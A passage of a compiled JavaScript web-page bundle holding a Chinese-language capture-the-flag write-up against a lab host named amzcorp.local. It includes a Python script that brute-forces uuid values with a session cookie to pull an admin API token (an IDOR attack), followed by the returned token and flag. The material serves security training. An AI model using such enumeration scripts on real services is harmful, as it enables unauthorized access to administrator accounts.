document.getElementById('output');\n    output.innerHTML = '';\n    if (username.value == \"\") {\n        output.innerHTML = \"Username value cannot be empty!\";\n        setTimeout(() => {\n            document.getElementById('closeAlert');\n        }, 2000);\n        return;\n    }\n    xhr.open('POST', '/api/v4/tokens/get');\n    xhr.responseType = 'json';\n    xhr.onload = function (e) {\n        if (this.status == 200) {\n            api_token.append(this.response['token']);\n        }\n    };\n    data = btoa('{\"get_token\":\"True\",\"uuid\":' + uuid ',\"username\":' + username + '}');\n    xhr.send({\n        \"data\": data\n    });\n}\n\nfunction GetLogData() {\n    var log_table = document.getElementById('log_table');\n    const xhr = new XMLHttpRequest();\n\n    xhr.open('GET', '/api/v4/logs/get');\n    xhr.responseType = 'json';\n    xhr.onload = function (e) {\n        if (this.status == 200) {\n            log_table.append(this.response['log']);\n        } else {\n            log_table.append(\"Error retrieving logs from logs.amzcorp.local\");\n        }\n    };\n    xhr.send();\n}\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u5176\u4e2d\uff0c\u6ce8\u610f\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-javascript",children:"function GetToken() {\n    var uuid = document.getElementById('uuid');\n    var username = document.getElementById('username');\n    var api_token = document.getElementById('api_token');\n    var output = document.getElementById('output');\n    output.innerHTML = '';\n    if (username.value == \"\") {\n        output.innerHTML = \"Username value cannot be empty!\";\n        setTimeout(() => {\n            document.getElementById('closeAlert');\n        }, 2000);\n        return;\n    }\n    xhr.open('POST', '/api/v4/tokens/get');\n    xhr.responseType = 'json';\n    xhr.onload = function (e) {\n        if (this.status == 200) {\n            api_token.append(this.response['token']);\n        }\n    };\n    data = btoa('{\"get_token\":\"True\",\"uuid\":' + uuid ',\"username\":' + username + '}');\n    xhr.send({\n        \"data\": data\n    });\n}\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\uff0c\u57fa\u4e8e\u5bf9 uuid \u7684\u7206\u7834\uff0c\u6765\u83b7\u53d6\u5230\u7ba1\u7406\u5458\u6743\u9650\u7684 token \u6570\u636e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'import requests, base64, sys\nfrom pwn import log\n\nbar = log.progress("uuid")\n\ntarget = "http://jobs.amzcorp.local/api/v4/tokens/get"\n\ncookies = {"session": "..eJw1jk1OAzEMhe-SNUJObCdxV1yC9chxHFHR6UiZdoW4O0GI5fv0_r7CNqafH-HymE9_Cdu1h0tAydFtlJJbJmIxVqFaEIDdvaTahsbCxiXH5Jw5I1FCLW7C2p1rTGYIiMJE0K0lrmqKvZsg8-rnlFCctEUc6oWAsmYYEVChh3Xkefr8eyMZF7Bzju1xfPp9oaGApFxEspNh7QRNKmCuHhN7rVyoeYsr57tebyuiGhO-6asd-6LzuPmC72vkXPJ37K67__vC9w_pEE6Z.Ze8T2w.vs_ygNfhRDvZx0mH_ZEcQsXqkIg"}\nheaders = {"Content-Type": "application/json"}\n\nfor uuid in range(0,1000):\n    data = \'{"get_token":"True","uuid":"%d","username":"admin"}\' % uuid\n    json = {"data": base64.b64encode(data.encode())}\n\n    request = requests.post(target, headers=headers, cookies=cookies, json=json)\n    bar.status(uuid)\n\n    if "Invalid" not in request.text:\n        print(request.text.strip())\n        bar.success(uuid)\n        sys.exit(0)\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-json",children:'{\n    "flag": "AWS{S1mPl3_iD0R_4_4dm1N}",\n    "token": "98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a",\n    "username": "admin",\n    "uuid": "955"\n}\n'})}),"\n",(0,a.jsx)(n.h2,{id:"inspector",children:"Inspector"})]})}function u(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(c,{...e})}):c(e)}},46223:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/image_20240322-222222-0b152f599f56d135c411d11dedac04b2.png"},69927:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/image_20240323-222310-7b9d6692473725ded922c4dc1a8cbf1c.png"},2886:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/image_20240323-222347-7925461d573b03df222956779194d8ae.png"},11507:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/image_20240324-222451-48cd5129856b5a63d65bd2f87a7553b4.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>s,a:()=>i});var a=t(67294);const r={},o=a.createContext(r);function i(e){const n=a.useContext(o);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function s(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),a.createElement(o.Provider,{value:n},e.children)}}}]);